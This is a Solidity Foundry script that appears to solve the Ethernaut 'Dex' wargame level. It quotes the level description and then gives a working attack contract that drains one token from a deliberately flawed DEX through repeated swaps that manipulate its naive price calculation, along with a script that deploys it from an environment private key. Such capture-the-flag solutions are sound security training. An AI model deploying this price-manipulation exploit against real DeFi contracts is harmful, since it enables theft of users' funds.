// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "openzeppelin-contracts-06/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function swap(address from, address to, uint256 amount) external;
}


/*
    The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

    You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

    You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.



    Quick note
    Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, <uint amount>) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.

    Things that might help:

    How is the price of the token calculated?
    How does the swap method work?
    How do you approve a transaction of an ERC20?
    Theres more than one way to interact with a contract!
    Remix might help
    What does "At Address" do?
 */


contract DexAttack {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(IDex _dex) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }

    function swap() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);

        require(token1.balanceOf(address(dex)) == 0);
    }
}

contract DexSolution is Script {

    IDex dex = IDex(0x04D1DA1a890ba4B44DE682597Ceb96f43e45D153);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        DexAttack dexAttack = new DexAttack(dex);
        dexAttack.swap();
        vm.stopBroadcast();
    }
}